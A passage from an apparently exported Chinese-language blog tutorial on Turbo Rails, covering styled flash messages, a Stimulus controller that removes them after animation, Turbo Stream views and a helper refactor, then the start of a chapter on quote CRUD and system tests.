  <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">translateX</span><span class="token punctuation">(</span>-50%<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span>
  <span class="token property">flex-direction</span><span class="token punctuation">:</span> column<span class="token punctuation">;</span>
  <span class="token property">align-items</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>
  <span class="token property">gap</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--space-s<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token property">max-width</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span>
  <span class="token property">width</span><span class="token punctuation">:</span> max-content<span class="token punctuation">;</span>
  <span class="token property">padding</span><span class="token punctuation">:</span> 0 <span class="token function">var</span><span class="token punctuation">(</span>--space-m<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token selector">&amp;__message</span> <span class="token punctuation">&#123;</span>
    <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--font-size-s<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token property">color</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--color-white<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token property">padding</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--space-xs<span class="token punctuation">)</span> <span class="token function">var</span><span class="token punctuation">(</span>--space-m<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token property">background-color</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--color-dark<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token property">animation</span><span class="token punctuation">:</span> appear-then-fade 4s both<span class="token punctuation">;</span>
    <span class="token property">border-radius</span><span class="token punctuation">:</span> 999px<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里的<code>.flash CSS class</code>是我们flash messages的容器，它在屏幕上是固定位置，每个独立的flash message都被<code>.flash_message CSS class</code>装饰，我们将使用<code>apper-then-fade</code>,一个自定义动画来展示flash messages。</p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css">// app/assets/stylesheets/config/_animations.scss

<span class="token atrule"><span class="token rule">@keyframes</span> appear-then-fade</span> <span class="token punctuation">&#123;</span>
  <span class="token selector">0%, 100%</span> <span class="token punctuation">&#123;</span>
    <span class="token property">opacity</span><span class="token punctuation">:</span>0
  <span class="token punctuation">&#125;</span>
  <span class="token selector">5%, 60%</span> <span class="token punctuation">&#123;</span>
    <span class="token property">opacity</span><span class="token punctuation">:</span>1
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这两个文件添加后，我们把它们加入到样式清单中。</p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css">// app/assets/stylesheets/application.sass.scss

<span class="token atrule"><span class="token rule">@import</span> <span class="token string">"components/flash"</span><span class="token punctuation">;</span></span>
<span class="token atrule"><span class="token rule">@import</span> <span class="token string">"config/animations"</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>我们在浏览器中看看效果吧，在登陆和注册时都会弹出对应的flash信息</p>
<hr>
<p>这里我在测试增删改时，发现并没有弹出flash message信息，看一下下面有没有解决方案</p>
<hr>
<p>当前系统有个小问题，当将鼠标移动到flash message区域，我们的鼠标样式即使在flash message消失时，也还是没有变，这是因为虽然我们的flash message可见度为9，但它依然存在于DOM上，并在页面数据上面，为了解决这个问题，我们需要当消失时从DOM中删除flash messages。</p>
<p>这就是我们整个教程中需要加入的JS代码，我们将创建一个<a href="https://stimulus.hotwired.dev/handbook/introduction">Stimulus Controller</a>来删除flash message，当<code>appear-then-fade</code>动画效果消失时。</p>
<p>执行下面的指令，来创建一个叫做<code>removals</code>的Stimulates Controller</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">bin/rails generate stimulus removals<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>执行后将会把新建的Stimulate Controller自动导入到<code>app/javascript/controllers/index.js</code>文件中</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// app/javascript/controllers/index.js</span>

<span class="token keyword">import</span> <span class="token punctuation">&#123;</span> application <span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">"./application"</span>

<span class="token keyword">import</span> HelloController <span class="token keyword">from</span> <span class="token string">"./hello_controller.js"</span>
application<span class="token punctuation">.</span><span class="token function">register</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">,</span> HelloController<span class="token punctuation">)</span>

<span class="token keyword">import</span> RemovalsController <span class="token keyword">from</span> <span class="token string">"./removals_controller.js"</span>
application<span class="token punctuation">.</span><span class="token function">register</span><span class="token punctuation">(</span><span class="token string">"removals"</span><span class="token punctuation">,</span> RemovalsController<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以看到，这里有一个<code>HelloController</code>,是在我们创建项目时自动生成的，我们不再需要它了，删除掉</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">bin/rails destroy stimulus hello<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这个指令就会删除掉<code>HelloController</code>,并且更新index.js文件</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// app/javascript/controllers/index.js</span>

<span class="token keyword">import</span> <span class="token punctuation">&#123;</span> application <span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">"./application"</span>

<span class="token keyword">import</span> RemovalsController <span class="token keyword">from</span> <span class="token string">"./removals_controller.js"</span>
application<span class="token punctuation">.</span><span class="token function">register</span><span class="token punctuation">(</span><span class="token string">"removals"</span><span class="token punctuation">,</span> RemovalsController<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<p>**注意:**如果你执行<code>bin/rails destroy stimulus hello</code>时，并没有更新掉HelloController的信息，这可能是Rails的小bug，你可以直接手动删除或者执行：<code>bin/rails stimulus:manifest:update</code>指令。</p>
<hr>
<p>现在我们来实现我们的Stimulates Controller</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// app/javascript/controllers/removals_controller.js</span>

<span class="token keyword">import</span> <span class="token punctuation">&#123;</span> Controller <span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">"@hotwired/stimulus"</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">class</span> <span class="token class-name">extends</span> Controller <span class="token punctuation">&#123;</span>
  <span class="token function">remove</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>element<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这个controller有一个叫<code>remove</code>的简洁函数，当我们调用该方法时，指定这个controller的DOM节点就会被删除。</p>
<p>如果觉得有点儿抽象，我们就在我们的flash messages中使用controller，当动画消失时，删除DOM节点。并解释到底是怎么运转的。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token string-literal"><span class="token string">%# app/views/layouts/_flash.html.erb %>

&lt;% flash.each do |flash_type, message| %>
  &lt;div
    class="flash__message"
    data-controller="removals"
    data-action="animationend->removals#</span></span>remove"
  <span class="token operator">></span>
    <span class="token operator">&lt;</span><span class="token operator">%=</span> message <span class="token string-literal"><span class="token string">%>
  &lt;/div></span></span>
<span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">end</span> <span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>由于data attribute的命名约定，Stimulus库允许我们将在Stimulus Controller中定义的JavaScript行为链接到HTML。</strong></p>
<p>上面的HTML片段会指定每个flash message连通到RemovalsController，这是因为我们指定了：<code>data-controller=&quot;removals</code>,当动画结束时，<code>RemovalsController</code>中的<code>remove</code>函数就会被调用，因为我们指定了：<code>data-action=&quot;animationend-&gt;removals#remove</code>。</p>
<p>如果我们在浏览器中测试一下，就能发现，当动画消失时，flash message的DOM真的被移除了。</p>
<p>下面我们将Turbo从新打开，来展示Flash message</p>
<h2 id="Flash-messages-with-Turbo-in-Rails-7"><a href="#Flash-messages-with-Turbo-in-Rails-7" class="headerlink" title="Flash messages with Turbo in Rails 7"></a>Flash messages with Turbo in Rails 7</h2><p>首先把禁用Turbo的代码去掉</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// app/javascript/application.js</span>

<span class="token keyword">import</span> <span class="token string">"./controllers"</span>
<span class="token keyword">import</span> <span class="token string">"@hotwired/turbo-rails"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>我们会发现，又变成了单页面，但尽管我们使用了<code>notice:</code>，我的flash message却不见了。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># app/controllers/quotes_controller.rb</span>

<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">create</span></span>
  <span class="token variable">@quote</span> <span class="token operator">=</span> current_company<span class="token punctuation">.</span>quotes<span class="token punctuation">.</span>build<span class="token punctuation">(</span>quote_params<span class="token punctuation">)</span>

  <span class="token keyword">if</span> <span class="token variable">@quote</span><span class="token punctuation">.</span>save
    respond_to <span class="token keyword">do</span> <span class="token operator">|</span>format<span class="token operator">|</span>
      format<span class="token punctuation">.</span>html <span class="token punctuation">&#123;</span> redirect_to quotes_path<span class="token punctuation">,</span> <span class="token symbol">notice</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"Quote was successfully created."</span></span> <span class="token punctuation">&#125;</span>
      format<span class="token punctuation">.</span>turbo_stream
    <span class="token keyword">end</span>
  <span class="token keyword">else</span>
    render <span class="token symbol">:new</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>让我们给Turbo Stream format添加相同的flash message数据</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># app/controllers/quotes_controller.rb</span>

<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">create</span></span>
  <span class="token variable">@quote</span> <span class="token operator">=</span> current_company<span class="token punctuation">.</span>quotes<span class="token punctuation">.</span>build<span class="token punctuation">(</span>quote_params<span class="token punctuation">)</span>

  <span class="token keyword">if</span> <span class="token variable">@quote</span><span class="token punctuation">.</span>save
    respond_to <span class="token keyword">do</span> <span class="token operator">|</span>format<span class="token operator">|</span>
      format<span class="token punctuation">.</span>html <span class="token punctuation">&#123;</span> redirect_to quotes_path<span class="token punctuation">,</span> <span class="token symbol">notice</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"Quote was successfully created."</span></span> <span class="token punctuation">&#125;</span>
      format<span class="token punctuation">.</span>turbo_stream <span class="token punctuation">&#123;</span> flash<span class="token punctuation">.</span>now<span class="token punctuation">[</span><span class="token symbol">:notice</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"Quote was successfully created."</span></span> <span class="token punctuation">&#125;</span>
    <span class="token keyword">end</span>
  <span class="token keyword">else</span>
    render <span class="token symbol">:new</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>我们使用了<code>flash.now[:notice]</code>而不是<code>flash[:notice]</code>是因为Turbo Stream的响应不会重定向到其他地方，页面不会刷新，所以flash信息必须在当前页面出现。</p>
<p>如果你在浏览器中测试一下，flash message仍然无法显示在页面，这是因为我们指定当quote成功创建后渲染的页面如果去处理flash message。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token comment"># app/views/quotes/create.turbo_stream.erb %></span>

<span class="token operator">&lt;</span><span class="token operator">%=</span> turbo_stream<span class="token punctuation">.</span><span class="token keyword">prepend</span> <span class="token string-literal"><span class="token string">"quotes"</span></span><span class="token punctuation">,</span> <span class="token variable">@quote</span> <span class="token string-literal"><span class="token string">%>
&lt;%= turbo_stream.update Quote.new, "" %></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>为了让flash message与Turbo Stream responses合作，我们需要添加一行去指定Turbo将flash message添加到列表前面，或者更新flash message容器中的内容。</p>
<p>我们使用的Turbo Stream动作取决于我们想要的效果。如果我们要堆叠Flash消息，并有一个单页的应用效果，我们可以使用prepend。如果我们要有一个单一的闪烁消息在屏幕上的时候，我们可以使用替换。</p>
<p>本次教程中使用 prepend</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token comment"># app/views/quotes/create.turbo_stream.erb %></span>

<span class="token operator">&lt;</span><span class="token operator">%=</span> turbo_stream<span class="token punctuation">.</span><span class="token keyword">prepend</span> <span class="token string-literal"><span class="token string">"quotes"</span></span><span class="token punctuation">,</span> <span class="token variable">@quote</span> <span class="token string-literal"><span class="token string">%>
&lt;%= turbo_stream.update Quote.new, "" %></span></span>
<span class="token operator">&lt;</span><span class="token operator">%=</span> turbo_stream<span class="token punctuation">.</span><span class="token keyword">prepend</span> <span class="token string-literal"><span class="token string">"flash"</span></span><span class="token punctuation">,</span> <span class="token symbol">partial</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"layouts/flash"</span></span> <span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>最后一行代码指定Turbo去prepend到id为flash的DOM前面，插入<code>layouts/flash</code>局部信息，我们当前并没有一个id为flash的DOM，所以我们加上这部分</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
    <span class="token comment">&lt;!-- All the head code --></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>

  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
    &lt;%= render "layouts/navbar" %>

    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>flash<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>flash<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
      &lt;%= render "layouts/flash" %>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>

    &lt;%= yield %>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>让我们在浏览器中测试一下，当创建两个quotes后，我们可以看到两个flash message出现在屏幕中，并在动画结束后消失。</p>
<p>让我们画一些草图，来说明当我们创建一条记录时，发生了什么，当我们创建数据时：</p>
<p><img src="../../../../public/img/image-20230615124218534.png" alt="image-20230615124218534"></p>
<p>当我们提交表单时，这条数据被创建，并且渲染<code>create.turbo_stream.erb</code>页面，而这个页面会控制Turbo完成下面的操作</p>
<ul>
<li>把新加的数据添加到id为<code>quotes</code>的DOM前面</li>
<li>清空id为<code>new_quote</code>的DOM内容</li>
<li>把flash message的信息放到id为<code>flash</code>的DOM前面</li>
</ul>
<p>当这三个行为被执行时，我们的最终页面会变成下面的样子：</p>
<p><img src="../../../../public/img/image-20230615124555588.png" alt="image-20230615124555588"></p>
<p>现在我们的flash message可以与<code>QuotesController#create</code>一起工作了，所以我们再在<code>QuotesController#update and QuotesController#destory</code>中添加flash messages，在阅读下面的两部分前，我们可以放轻松了。</p>
<h2 id="Flash-messages-with-Hotwire-on-the-update-action"><a href="#Flash-messages-with-Hotwire-on-the-update-action" class="headerlink" title="Flash messages with Hotwire on the #update action"></a>Flash messages with Hotwire on the <code>#update</code> action</h2><p>与<code>#create action</code>不同，<code>#update action</code>并没有为Turbo Stream responses指定具体的视图，如果我们在浏览器中测试，flash message并不会在页面中出现。</p>
<p>如果我们在第四章讨论的，quote编辑表单是嵌入在Turbo Frame中的，而Turbo Frame是独立于页面其他部分的，当我们修改数据时，即使响应信息中包含flash message，<strong>Turbo也只会摘取和替换响应体中被修改数据的信息。</strong></p>
<p>如果我们想对<code>#update action</code>添加flash message，我们就必须像<code>#create action</code>一样，创建对应的Turbo Stream view。而我们要做的第一件儿事儿就是修改<code>#update method</code>在controller中。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">def</span> <span class="token method-definition"><span class="token function">update</span></span>
  <span class="token keyword">if</span> <span class="token variable">@quote</span><span class="token punctuation">.</span>update<span class="token punctuation">(</span>quote_params<span class="token punctuation">)</span>
    respond_to <span class="token keyword">do</span> <span class="token operator">|</span>format<span class="token operator">|</span>
      format<span class="token punctuation">.</span>html <span class="token punctuation">&#123;</span> redirect_to quotes_path<span class="token punctuation">,</span> <span class="token symbol">notice</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"Quote was successfully updated."</span></span> <span class="token punctuation">&#125;</span>
      format<span class="token punctuation">.</span>turbo_stream <span class="token punctuation">&#123;</span> flash<span class="token punctuation">.</span>now<span class="token punctuation">[</span><span class="token symbol">:notice</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"Quote was successfully updated."</span></span> <span class="token punctuation">&#125;</span>
    <span class="token keyword">end</span>
  <span class="token keyword">else</span>
    render <span class="token symbol">:edit</span><span class="token punctuation">,</span> <span class="token symbol">status</span><span class="token operator">:</span> <span class="token symbol">:unprocessable_entity</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>我们指定update支持Turbo Stream format，我们也需要指定Turbo Stream view</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token comment"># app/views/quotes/update.turbo_stream.erb %></span>

<span class="token operator">&lt;</span><span class="token operator">%=</span> turbo_stream<span class="token punctuation">.</span>replace <span class="token variable">@quote</span> <span class="token string-literal"><span class="token string">%>
&lt;%= turbo_stream.prepend "flash", partial: "layouts/flash" %></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>现在再在浏览器中测试一下，如我们所见，当数据更新时，flash message也被渲染出了。</p>
<h2 id="Flash-messages-with-Hotwire-on-the-destroy-action"><a href="#Flash-messages-with-Hotwire-on-the-destroy-action" class="headerlink" title="Flash messages with Hotwire on the #destroy action"></a>Flash messages with Hotwire on the <code>#destroy</code> action</h2><p>和 创建，修改一样，我们先让<code>#destory</code>支持Turbo Stream format，并指定返回的flash message</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">def</span> <span class="token method-definition"><span class="token function">destroy</span></span>
  <span class="token variable">@quote</span><span class="token punctuation">.</span>destroy

  respond_to <span class="token keyword">do</span> <span class="token operator">|</span>format<span class="token operator">|</span>
    format<span class="token punctuation">.</span>html <span class="token punctuation">&#123;</span> redirect_to quotes_path<span class="token punctuation">,</span> <span class="token symbol">notice</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"Quote was successfully destroyed."</span></span> <span class="token punctuation">&#125;</span>
    format<span class="token punctuation">.</span>turbo_stream <span class="token punctuation">&#123;</span> flash<span class="token punctuation">.</span>now<span class="token punctuation">[</span><span class="token symbol">:notice</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"Quote was successfully destroyed."</span></span> <span class="token punctuation">&#125;</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>再写对应的Turbo Stream view</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token comment"># app/views/quotes/destroy.turbo_stream.erb %></span>

<span class="token operator">&lt;</span><span class="token operator">%=</span> turbo_stream<span class="token punctuation">.</span>remove <span class="token variable">@quote</span> <span class="token string-literal"><span class="token string">%>
&lt;%= turbo_stream.prepend "flash", partial: "layouts/flash" %></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>在浏览器中看看吧</p>
<h2 id="Refactoring-our-flash-messages-with-a-helper"><a href="#Refactoring-our-flash-messages-with-a-helper" class="headerlink" title="Refactoring our flash messages with a helper"></a>Refactoring our flash messages with a helper</h2><p>在我们刚刚创建的三个Turbo Stream view，我们在渲染flash message时，使用了相同的代码。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token operator">%=</span> turbo_stream<span class="token punctuation">.</span><span class="token keyword">prepend</span> <span class="token string-literal"><span class="token string">"flash"</span></span><span class="token punctuation">,</span> <span class="token symbol">partial</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"layouts/flash"</span></span> <span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这里有几个理由去进行修改，例如：我们想用 update 替换 prepend，或者修改 <code>layouts/flash</code> 为 <code>components/flash</code>，那我们每个页面都需要修改啊。</p>
<p>为了让这些修改更方便，一个策略就是删除重复的代码，DRY原则(Don’t Repeat Yourself)，抽离出来，这样未来只需要在一个地方去修改。</p>
<p>以我们的项目为例，我们将会创建helper来去除冗余，我们将定义函数在<code>ApplicationHelper</code></p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># app/helpers/application_helper.rb</span>

<span class="token keyword">module</span> <span class="token class-name">ApplicationHelper</span>
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">render_turbo_stream_flash_messages</span></span>
    turbo_stream<span class="token punctuation">.</span><span class="token keyword">prepend</span> <span class="token string-literal"><span class="token string">"flash"</span></span><span class="token punctuation">,</span> <span class="token symbol">partial</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"layouts/flash"</span></span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后再在每个Turbo Stream views中使用helper</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token comment"># app/views/quotes/create.turbo_stream.erb %></span>

<span class="token operator">&lt;</span><span class="token operator">%=</span> turbo_stream<span class="token punctuation">.</span><span class="token keyword">prepend</span> <span class="token string-literal"><span class="token string">"quotes"</span></span><span class="token punctuation">,</span> <span class="token variable">@quote</span> <span class="token string-literal"><span class="token string">%>
&lt;%= turbo_stream.update Quote.new, "" %></span></span>
<span class="token operator">&lt;</span><span class="token operator">%=</span> render_turbo_stream_flash_messages <span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token comment"># app/views/quotes/update.turbo_stream.erb %></span>

<span class="token operator">&lt;</span><span class="token operator">%=</span> turbo_stream<span class="token punctuation">.</span>replace <span class="token variable">@quote</span> <span class="token string-literal"><span class="token string">%>
&lt;%= render_turbo_stream_flash_messages %></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token comment"># app/views/quotes/destroy.turbo_stream.erb %></span>

<span class="token operator">&lt;</span><span class="token operator">%=</span> turbo_stream<span class="token punctuation">.</span>remove <span class="token variable">@quote</span> <span class="token string-literal"><span class="token string">%>
&lt;%= render_turbo_stream_flash_messages %></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>通过使用helper，我们可以安全的修改flash信息如何在整个页面中展示，我们的代码变的更整洁。</p>
<h2 id="Wrap-up"><a href="#Wrap-up" class="headerlink" title="Wrap up"></a>Wrap up</h2><p>Flash messages是一个很重要的工具，可以提供使用者重要信息。</p>
<p>在Rails7使用Flash message时，我们需要一些调整，相比之前的版本。</p>
<p>并且现在我们能做的更多，例如：当在短时间内发生多个操作时，可以堆叠闪存消息！</p>
<p>在下一章中，我们将学习到另一个重要工具，来提升用户体验。<strong>Empty status!</strong></p>
]]></content>
      <categories>
        <category>Turbo-Rails</category>
      </categories>
      <tags>
        <tag>Rails</tag>
        <tag>turbo</tag>
      </tags>
  </entry>
  <entry>
    <title>Turbo Rails Tutorial-第二章</title>
    <url>//post/Ruby/Hotails/%E7%AC%AC%E4%BA%8C%E7%AB%A0.html</url>
    <content><![CDATA[<p>​    </p>
<h2 id="实现简单的增删改查"><a href="#实现简单的增删改查" class="headerlink" title="实现简单的增删改查"></a>实现简单的增删改查</h2><blockquote>
<p>这一章，我们将要创建quote模型，并关联Controller通过Rails的约定</p>
</blockquote>
<p>我们先通过<a href="https://excalidraw.com/">Excalidraw</a>来画一些草图，来描述我们要做的事儿</p>
<p>在<code>Quotes#index</code>页面中，我们将展示quotes集合，并且每个quote都有详情，修改，删除的按钮，并且也有增加的按钮。下面是样式图：</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/f5e0db42b50a65d111b4945dcbde67cf.png" alt="img"></p>
<p>当点击<code>New quote</code>按钮时跳转到<code>Quotes#new</code>页面：</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/a018ec6ac774ee170e281b7a9831753f.png" alt="img"></p>
<p>当点击<code>Create quote</code>时跳转到<code>Quotes#index</code>页面，显示存储的数据，并按照时间排序。</p>
<p>当你点击Edit按钮时，就会跳转到<code>Quotes#edit</code>去更新已有的数据</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/ut.png" alt="img"></p>
<p>当点击<code>Update quote</code>，还是跳回<code>Quotes#index</code>页面</p>
<p>当点击quote的标题时，则跳转到<code>Quotes#show</code>，现在我们仅仅显示标题，后面增加其他内容。</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/ff89835e6e40860a36acd80a8015223c.png" alt="img"></p>
<p>在开始之前，我们先创建一些测试用例去确保我们构建的内容正常</p>
<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><blockquote>
<p>测试是软件开发的基础部分，如果没有一个强有力的测试，我们将会引入bug，并无意间影响以往的功能。</p>
</blockquote>
<ul>
<li>创建测试文件</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">bin/rails g system_test quotes<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>编写测试用例</li>
</ul>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># test/system/quotes_test.rb</span>
<span class="token keyword">require</span> <span class="token string-literal"><span class="token string">"application_system_test_case"</span></span>

<span class="token keyword">class</span> <span class="token class-name">QuotesTest</span> <span class="token operator">&lt;</span> ApplicationSystemTestCase
  test <span class="token string-literal"><span class="token string">"Creating a new quote"</span></span> <span class="token keyword">do</span>
    <span class="token comment"># When we visit the Quotes#index page</span>
    <span class="token comment"># we expect to see a title with the text "Quotes"</span>
    visit quotes_path
    assert_selector <span class="token string-literal"><span class="token string">"h1"</span></span><span class="token punctuation">,</span> <span class="token symbol">text</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"Quotes"</span></span>

